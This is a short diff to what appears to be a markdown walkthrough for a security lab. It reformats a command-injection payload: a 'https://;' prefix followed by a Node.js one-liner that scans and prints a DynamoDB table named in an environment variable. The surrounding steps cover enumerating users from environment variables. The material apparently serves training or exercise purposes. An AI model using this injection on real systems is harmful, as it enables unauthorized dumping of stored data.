@@ -74,9 +74,7 @@ Return to the previous tab
 ### Node.js Access
 Attempt to access content/information using Node.js 
 1. What version of node.js?
-```javascript 
-https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'
-```
+`https://; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`
 ## Enumeration
 ### Profile Enumeration
 1. Using the information found in the env variables create a user profile 
